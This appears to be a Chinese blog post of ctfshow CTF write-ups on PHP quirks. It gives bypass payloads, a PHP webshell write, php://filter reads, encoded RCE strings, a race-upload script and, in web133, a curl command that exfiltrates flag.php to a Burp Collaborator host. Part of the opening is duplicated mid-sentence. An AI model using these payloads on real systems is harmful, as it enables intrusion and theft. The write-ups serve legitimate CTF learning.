---
layout: post
title: ctfshow-php特性
date: 2021-02-10
tags: ["web"]
---

[toc]

## web89

代码审计，不出现数字，然后转化成十进制又是数字的。明显数组绕过。

    ?num[]=1

## web90

注意：假如intval函数的第二个参数为0，那么根据形式来判断：
1.0x开头，十六进制
2.0开头，八进制
3.其他为十进制
php为弱类型的，而三个等于[toc]

## web89

代码审计，不出现数字，然后转化成十进制又是数字的。明显数组绕过。

    ?num[]=1

## web90

注意：假如intval函数的第二个参数为0，那么根据形式来判断：
1.0x开头，十六进制
2.0开头，八进制
3.其他为十进制
php为弱类型的，而三个等于为强比较，不仅值要相同，变量类型也需要相同。
代码审计，要num本身不等于"4476"，然后根据形式转化为十进制后等于4476。
那么使用十六进制或者八进制就可以了。

    ?num=117c
    ?num=010574

## web91

正则表达式匹配方法，i为忽略大小写，m为多行匹配。
代码审计，只需要在多行里面有php，然后第一行里面没有php就可以了。
换行符编码一下是%0a，因此用%0a绕过就可以了。

    ?cmd=%0aphp

## web92

代码审计，不是4476的形式，转化成十进制等于4476，明显十六进制

    ?num=0x117c

## web93

代码审计，不是4476的形式，转化成十进制等于4476，不能出现字母，明显八进制

    ?num=010574

## web94

代码审计，不能刚好等于4476，不能八进制，不能十六进制，小数绕过。

    ?num=4476.0

## web95

代码审计，不能十六进制，0不能再第一个字符，不能等于4476。看了1哈，用8进制，但是开头可以加个加号。牛。

    ?num=+010574

## web96

注意注意，别在那里加引号啥的，这不是linux命令
payload:

    ?u=./flag.php

## web97

md5函数漏洞看[这个](https://blog.csdn.net/qq_19980431/article/details/83018232)
这里明显数组绕过

    a[]=1&b[]=2

## web98

代码审计，看最后一行，是要get方法传入的HTTP_FLAG的值等于flag才可以显示flag。
再看第一行的三元运算符，意思是假如有get方法传入了值，后面的get方法意思都是post方法。
那么中间两行不管了，直接是get方法随便传一个值，然后POST方法传入HTTP_FLAG一个flag值就行。

    ?1=1
    HTTP_FLAG=flag

## web99

这里需要知道一个in_array()函数的漏洞，即若未设置第三个参数strict，会自动转换，例如若数组全为整型，那么搜索的值会被自动转换为整型。
代码审计：
allow数组里面是很多个随机数，然后检查是否用get方法传入n的值和get方法传入n的值是否在allow数组里面，假如都有的话就往文件名为get方法传入的n的值里面写入post方法写入的content的值。
那明显，我们要往一个php文件里面写入php代码，那文件名就可以写成2.php，在数组检索的时候会被转化成2，就可以绕过这个检测。

    ?n=2.php
    content=<?php @eval($_POST[1]);?>

## web100

首先存在一个优先级问题，and和&&的优先级是不一样的，and甚至比=的优先级低，所以代码中v0的值就等于第一个and之前的值。
所以首先，只需要保证v1为数字就可以绕过对于v0的判断。
第二部分，对于输出flag的值，可以知道v3要为分号，但是由于正则不能让分号在第一个字符的位置，所以可以添加内联使得分号不在第一个字符的位置。
所以可以采用的payload如下：

    ?v1=1&v2=var_dump($ctfshow)/*&v3=*/;

但是查看了大佬的wp，其实这是要考反射，所以这里写一下预期解：

    ?v1=1&v2=echo new ReflectionClass&v3=/**/;

## web101

用上一题的预期解

## web102

hex2bin():把十六进制转二进制字符串（转成字母）
本身是可以用hex2bin()函数绕过的，因为is_numeric()在php5环境下对于十六进制也是true，但是这道题是php7环境的，所以is_numeric()在这道题环境下绕不过。
参考了别的师傅的wp,再base64一下，需要一个全是数字的base64。。。额
参考wp，此处使用的shell是：

    <?=`cat *`;

它base64一下，是PD89YGNhdCAqYDs=，等号是填充的可以不用。
然后转化成十六进制是5044383959474e6864434171594473。倒推一下，前面还要加两位数字。比如99，就是995044383959474e6864434171594473。
(e会被当做是科学计数法，可以绕过is_numeric)
再来还原一下这个过程：
取v2前两位之后的字符串，再使其hex2bin变成字符串，然后在写入文件的时候将其base64解码。
所以payload:

    ?v2=995044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php
    v1=hex2bin

## web103

同上题

## web104

代码审计，太简单了直接v1=v2=1

    ?v2=1
    v1=1

## web105

代码审计，对于每一个get，把值作为变量名的变量传递给键的变量名的变量，但是键不能为error；
对于每一个post同理，但是值不能为flag。
代码审计，下面无论如何都会执行die($error)，所以干脆把error的值替换为flag的值，让这里直接输出flag。
但是又有上面get和post的限制，所以传递一下就好了。

    ?q=flag
    error=q

## web106

数组直接绕

    ?v2[]=1
    v1[]=2

## web107

v1数组的flag的值等于v3的md5值

    ?v3=1
    v1=flag=c4ca4238a0b923820dcc509a6f75849b

## web108

ereg函数存在NULL截断漏洞，用%00截断后后面的不会进行匹配。

    ?c=fx%00778

## web109

preg_match的返回值是匹配到的次数，因此只要里面有字母就可以过preg_match。
所以接下来只需要利用eval()函数就可以直接执行了，没有过滤就随便执行一下好了。

    ?v1=Exception();system('tac fl36dg.txt');&v2=a

## web110

过滤了很多，明显是不能用上题的分号什么来绕过了。
看了wp,php有内置类FilesystemIterator()，可以遍历某个目录下的所有文件，然后用getcwd()方法来得到当前路径。

    v1=FilesystemIterator&v2=getcwd

然后访问fl36dga.txt即可

## web111

注意就是php里面，函数内部不放访问外部的变量。
但是有一个就是GLOBALS这个变量，可以得到所有的全局变量。
所以把GLOBALS赋给ctfshow就可以。

    ?v1=ctfshowfx&v2=GLOBALS

## web112

不能直接是个文件，过滤base64啥的
直接读就好了

    ?file=php://filter/resource=flag.php

## web113

考察is_file文件的漏洞。
linux下，/proc/self/root指向的是根目录，多次/proc/self/root，可以溢出is_file函数。
payload:

    ?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php

## web114

又到了直接读环节

    ?file=php://filter/resoure=flag.php

## web115

考点：is_numeric函数和trim函数的绕过。
首先注意,!加两个等于是全等于的否定。
trim函数可以去除字符串左右两边指定的字符，默认去除空格什么的。
首先可以自己编写脚本，查看哪些可以绕过trim函数。
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_64814f2209e9a3eab630241b0e79d87c.jpg)](wp_editor_md_64814f2209e9a3eab630241b0e79d87c.jpg)
可以看到有三个可以不被trim函数处理。
其中43和48是0和+，在本题中会被过滤。
那么使用12对应的url编码就是%0c就可以了。

    ?num=%0c36

## web123

太复杂了，首先第一点复杂就是，php不允许变量命名有.号，所以那个post怎么办呢。
看了下[羽师傅的wp](https://blog.csdn.net/miuzzx/article/details/109181768)，发现这个CTF_SHOW.COM变成CTF[SHOW.COM就可以了。
这是。。。。？缓缓打出一个问号
所以知道了这个之后可以有一个简单的非预期：

    CTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag

很明显太简单了，考的不是这个
另外一个$_server，羽师傅也有写的。
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_f74ba4425b423864116163215e152d14.jpg)](wp_editor_md_f74ba4425b423864116163215e152d14.jpg)
然后自己查了一下，SERVER["QUERY_STRING"]的值是等于url里面?以后的值，比如www.baidu.com?a=1123, 这个值就等于a=1123
所以羽师傅又写了一个非预期：

    ?$fl0g=flag_give_me;
    CTF_SHOW=1&CTF[SHOW.COM=1&fun=eval($a[0])

确实太牛了，不过这还不是预期，接下来写预期：
出题人说想考的是php的字符串解析的bypass，可以看[这个](https://www.freebuf.com/articles/web/213359.html)。
然后还是羽师傅测试出来的东西：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_9d6afb18c2a2f682a6c420b74f8134f9.jpg)](wp_editor_md_9d6afb18c2a2f682a6c420b74f8134f9.jpg)
所以分隔之后，$a[1]就都等于后面的一部分了。

    ?a=fx+fl0g=flag_give_me
    CTF_SHOW=1&CTF[SHOW.COM=1&fun=parse_str($a[1])

还有其他解法：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_44ab1d2e07f409d3d4831803ca4b25f1.jpg)](wp_editor_md_44ab1d2e07f409d3d4831803ca4b25f1.jpg)

## web125

同上题

## WEB126

同上可解

## web127

php在传入变量的时候要经过一次parse_str，写脚本测试：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_009f84a136c691def9f5221e0e8c5f4a.jpg)](wp_editor_md_009f84a136c691def9f5221e0e8c5f4a.jpg)
所以这四个字符都是可用的，过滤了三个，用空格即可。

    ?ctf show=ilove36d

## web128

考点：两个函数gettext()和get_defined_vars()的使用。

*   gettext()
函数本身很简单，返回值就是参数。
例如：echo gettext("hello")
就打印hello。
然而php开启gettext()的扩展之后，_()等效于gettext()。
例如：echo _("hello")打印hello。</p>
*   get_defined_vars()
打印所有已定义的变量，包括环境变量系统变量等等。

<p>答案到这里就呼之欲出了。只对f1进行了check，那调用的函数就是gettext()，然后f2传入get_defined_vars，外层的call_user_func就会调用这个函数了。

    ?f1=_&f2=get_defined_vars

## web129

可能是个常规题，看了下大佬们的wp有两种常见的解法：
payload1:
目录穿越，很好理解

    ?f=/ctfshow/../../../../../../var/www/html/flag.php

payload2:
伪协议读取，filter支持多种编码方式，不符合的会被过滤。

    ?f=php://filter/read=convert.base64-encode'ctfshow/resource=flag.php

经过测试，其实只用ctfshow编码也行

## web130

来个非预期

    ?f=ctfshow

考点：
php正则表达式的最大回溯次数绕过。
看了羽师傅的wp，php为了防止正则表达式的拒绝服务攻击，即reDOS，给pcre设定了一个回溯次数上限pcre.backtrack_limit。
回溯次数上限默认是100万，超过100万之后preg_match是返回false，而不是0或者1。
写python脚本即可：

    import requests
    url = "http://5f79e987-ed4f-4d12-a2fe-2d78dc881cbb.chall.ctf.show:8080/"
    data = {
        'f':'very'*250001+'ctfshow'
    }
    r = requests.post(url, data=data)
    print(r.text)

## web131

同上

## web132

首先访问robots.txt，发现/admin是源码。
考点：''，比较简单

    ?username=admin&code=admin&password=fx520

## web133

首先考点，其实是命令执行的骚操作。
羽师傅的小例子：

    get传参   F=`$F `;sleep 3
    经过substr($F,0,6)截取后 得到  `$F `;
    也就是会执行 eval("`$F `;");
    我们把原来的$F带进去
    eval("``$F `;sleep 3`");
    也就是说最终会执行  `   `$F `;sleep 3  ` == shell_exec("`$F `;sleep 3");
    前面的命令我们不需要管，但是后面的命令我们可以自由控制。
    这样就在服务器上成功执行了 sleep 3
    所以 最后就是一道无回显的RCE题目了

这是第一个知识点，相当于是用变量重叠执行命令。
注：羽师傅上面是不是写错了，应该是eval("$F `;sleep 3`;");吧，希望大家指正。
第二个知识点是curl的使用。

    payload 
    其中-F 为带文件的形式发送post请求
    xx是上传文件的name值，flag.php就是上传的文件 
    ?F=`$F`;+curl -X POST -F xx=@flag.php  http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net

解释一下就是在ctfshow的服务器，发送了一个post请求到我们的burp上面，同时带了一个文件就是flag.php。
测试如下：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_2b351a7db1d71b42ed0a2c2cdeda442e.jpg)](wp_editor_md_2b351a7db1d71b42ed0a2c2cdeda442e.jpg)

## web134

考点：get的理解和extract变量覆盖
首先，key1和key2的get和post不能有，所以用get方法传入?_POST[key1]=36d&_POST[key2]=36d
然后在parse_str的时候，解析成了数组$_POST的值，然后extract再把这个数组里面的键-键值给解析出来。

    ?_POST[key1]=36d&_POST[key2]=36d

## web135

wp写的是ping命令带出文件，我这里直接非预期nl了。

    ?F=`$F `;nl flag.php->fx.txt

## web136

考点：linux写文件命令tee的使用
首先看一下目录里面的文件：

    ?c=ls'tee fx

然后访问目录下的fx，发现只有index.php
继续，查看根目录：

    ?c=ls /'tee fx

发现根目录下有f149_15_h3r3。
查看即可。

    ?c=nl /f149_15_h3r3'tee fx

## web137

考点：php基础知识，调用类中的函数
php中->和::调用类中的成员的区别：
->用于动态语境中处理某个类的实例
而::可以调用一个静态的不依赖其他类的方法。

## web138

考点：call_user_func的使用
call_user_func除了可以直接传字符串，也可以传数组，借用羽师傅的例子就是：

    call_user_func(array($classname,$functionname))

所以payload：

    ctfshow[0]=ctfshow&ctfshow[1]=getFlag

## web139

羽师傅盲打，看[羽师傅](https://blog.csdn.net/miuzzx/article/details/109197158)

## web140

考点：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_b4c6cd43257c64096f99d29d89bb65ea.jpg)](wp_editor_md_b4c6cd43257c64096f99d29d89bb65ea.jpg)
intval()函数，它会将非数字字符转换成0.
所以可以用很多函数了。

    f1=md5&f2=md5
    f1=md5&f2=phpinfo

## web141

考点：
return的绕过。
由于执行了return之后，后面的不会执行了，所以需要绕过这个return。
php中，数字和命令可以做运算，从而绕过。例如：

    1-phpinfo()-1 ;

是可以输出phpinfo()的。
所以本题就可以实现绕过。
另：v3只能是数字字母，所以用羽师傅的脚本即可。

    ?v1=1&v3=-(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F)-&v2=1

## web142

考点：？
我做的时候在用int的溢出，后来发现可以是0

    ?v1=0
    ?v1=17779

## web143

和141类似，注意的是这里取反和or被过滤了，所以用异或的脚本。
其次就是脚本需要改一下过滤的字符。

    ?v1=1&v2=1&v3=*("%0c%06%0c%0b%05%0d"^"%7f%7f%7f%7f%60%60")("%0b%01%03%00%06%0c%00"^"%7f%60%60%20%60%60%2a")?>

## web144

代码审计，v1是数字，v3长度只能为1，因此在v2构造命令即可。

    ?v1=1&v3=-&v2=(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)

## web145

考点：三目运算符
羽师傅nb
这样可以执行phpinfo:

    eval("return 1?phpinfo():1;"");

因此payload也可以：

    ?v1=1&v3===(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)''&v2=1

## web146

考点：等号和位运算符
如下可以执行phpinfo：

    eval("return 1==phpinfo()''1;");

所以payload:

    v1=1&v3===(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)''&v2=1

## web147

考点：1.正则表达式的绕过
2.create_function()函数的注入
首先看这个正则表达式，要在我们需要执行的函数开头或者结尾匹配一个不是数字的字符。看了下别的师傅fuzz了一下是在开头加上一个\，原理是，php的函数调用的默认命名空间就是在\下，所以加一个\是不影响函数的调用的。
第二个就是create_function函数的注入。这个函数使用方法如下：

    create_function('$a,$b','return 111;');

    =>

    function a($a,$b){
        return 111;
    }

然而这个函数的使用是用字符串拼接的，因此可以存在注入：

    create_function('$a,$b','return 111;}{phpinfo();')

    =>

    function a($a,$b){
        return 111;}{phpinfo();
    }

所以这道题的payload也很明显了：

    ?show=echo 123;}{system('tac f*');
    post: ctf=\create_function

## web148

俺一看，没有过滤异或，所以直接用异或调用了get_ctfshow_fl0g()函数：

    ?code=("%07%05%09%01%03%09%06%08%08%0f%08%01%06%0c%0b%07"^"%60%60%7d%5e%60%7d%60%7b%60%60%7f%5e%60%60%3b%60")(""^"");

看了一下别的师傅发现预期解不是这样的，预期解是利用中文变量。
羽师傅的payload:

    code=$哈="`{{{"^"?<>/";${$哈}[哼](${$哈}[嗯]);&哼=system&嗯=tac f*
    其中，"`{{{"^"?<>/"; 异或出来的结果是 _GET

原理其实类似，是异或出来了一个get方法使用。

## web149

考点：竞争上传
用burp半天写不好，后来写脚本一下爆出来了

    import requests
    import threading
    import io

    url = "http://0fad4f91-e056-4df2-8433-ab03c1675b47.chall.ctf.show:8080/"

    def write():
        while event.isSet():
            data = {
                'show' : '<?php system("cat /ctfshow_fl0g_here.txt");?>'
            }
            requests.post(url+'?ctf=1.php',data=data)

    def read():
        while event.isSet():
            response = requests.get(url+'1.php')
            if response.status_code !=404:
                print(response.text)
                event.clear()

    if __name__=='__main__':
        event = threading.Event()
        event.set()
        for i in range(0,100):
            threading.Thread(target=write).start()

        for i in range(0,100):
            threading.Thread(target=read).start()

## web150